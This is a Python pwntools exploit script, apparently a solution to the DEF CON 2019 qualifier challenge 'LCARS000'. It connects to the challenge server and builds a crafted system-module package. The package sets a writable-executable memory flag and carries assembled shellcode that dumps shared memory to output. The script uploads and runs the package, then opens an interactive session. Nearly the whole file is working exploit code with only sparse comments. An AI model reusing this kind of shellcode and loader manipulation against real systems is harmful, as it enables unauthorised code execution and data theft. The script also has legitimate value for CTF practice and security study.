from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
# ./LCARS init.sys loader.sys echo.sys crypto.sys root.key flag1.papp flag2.txt flag3.txt
# r = process(['./LCARS', 'init.sys', 'loader.sys', 'echo.sys', 'crypto.sys', 'root.key', 'flag1.papp', 'flag2.txt', 'flag3.txt'])
r = remote('lcars000.quals2019.oooverflow.io', 5000)

script = '''
b *0x0000000100001BEC
b *0x00000001000011AA
set follow-fork-mode child
set follow-fork-mode parent
'''

# gdb.attach(r, script)

HEADER = 'EFIL' + p32(0x1)
HEADER = HEADER.ljust(0x28, '\x00')

CODE_LENGTH = 0x300

SECOND = p32(0x20001000) # 0x1000 align
SECOND += p32(CODE_LENGTH) # code_length 0x10 align, < 0xfff
SECOND += '\x05' # sig param 8 // & 7 -> rwx
SECOND += '\x00' # 0 or 1
SECOND += '\x00' # sig param 10
SECOND += '\x00' # 0 or 1
SECOND = SECOND.ljust(0x0c, '\x00')

context.arch = 'amd64'
SIG_INFO = ''
SIG_INFO += asm('mov rax, 0x30000000')
SIG_INFO += asm('mov rbx, 0')
SIG_INFO += asm('mov [rax], rbx') # switch / case
SIG_INFO += asm('mov rbx, 1')
SIG_INFO += asm('mov [rax+4], rbx') # s
SIG_INFO += asm('mov rbx, 0xff00') # length
SIG_INFO += asm('mov [rax+8], rbx') #
SIG_INFO += asm('mov rbx, 1')
SIG_INFO += asm('mov [rax+12], rbx') #
SIG_INFO += asm('mov rbx, 1')
SIG_INFO += asm('mov [rax+16], rbx') #
SIG_INFO += asm('mov r13, 0x30000000')
SIG_INFO += asm(shellcraft.write(0, 'r13', 0x200))
SIG_INFO += '\xc3'
SIG_INFO = SIG_INFO.ljust(0x100, '\x41')

# shared = 0x40000000

CRYPTO_INFO = ''
CRYPTO_INFO = CRYPTO_INFO.ljust(0x30, '\x42')

CODE = ''
CODE += '\xcc'
CODE = CODE.ljust(CODE_LENGTH, '\xcc')

data = ''
data += HEADER
data += SECOND
data += SIG_INFO
data += CRYPTO_INFO
data += CODE


r.sendline('run flag1.papp')
r.sendline('download juno.sys %d' % len(data))
r.send(str(data))
r.sendline('run juno.sys')

r.interactive()
